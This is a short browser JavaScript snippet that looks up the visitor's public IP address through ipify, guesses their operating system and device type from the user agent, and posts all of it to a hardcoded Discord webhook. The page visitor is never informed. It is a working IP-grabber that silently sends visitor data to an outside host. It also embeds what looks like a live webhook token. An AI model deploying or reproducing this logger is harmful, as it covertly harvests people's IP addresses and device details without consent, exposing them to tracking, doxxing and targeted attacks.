// Replace with your actual Discord webhook URL
const webhookUrl = 'https://discord.com/api/webhooks/1292149103060451338/BXUTW5Mh5awEnBMiFu8oeVcEwxTZyOl-wC8e1m4HMO9UaYMZ-aB8t3yUNs8RAL7hmYFb';

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    const userIp = data.ip;

    // Get user's operating system (simplified approach)
    const userAgent = navigator.userAgent;
    let os = 'Unknown';
    if (userAgent.includes('Windows')) {
      os = 'Windows';
    } else if (userAgent.includes('Macintosh')) {
      os = 'macOS';
    } else if (userAgent.includes('Linux')) {
      os = 'Linux';
    } else if (userAgent.includes('Android')) {
      os = 'Android';
    } else if (userAgent.includes('iOS')) {
      os = 'iOS';
    }

    // Guess the device type
    let deviceType = 'Unknown';
    if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(userAgent)) {
      deviceType = 'Tablet';
    } else if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(Opera Mini)/i.test(userAgent)) {
      deviceType = 'Mobile';
    } else {
      deviceType = 'PC';
    }

    // Create Discord embed payload
    const embed = {
      title: 'New User Detected!',
      color: 0x00ff00, // Green color
      fields: [
        { name: 'IP Address', value: userIp, inline: true },
        { name: 'Operating System', value: os, inline: true },
        { name: 'Device Type', value: deviceType, inline: true },
        { name: 'User Agent', value: userAgent, inline: false }, // Log the user agent for device info
      ],
    };

    // Send data to Discord webhook
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ embeds: [embed] }),
    })
      .then(() => console.log('Data sent to Discord!'))
      .catch(error => console.error('Error sending data:', error));
  })
  .catch(error => console.error('Error fetching IP:', error));
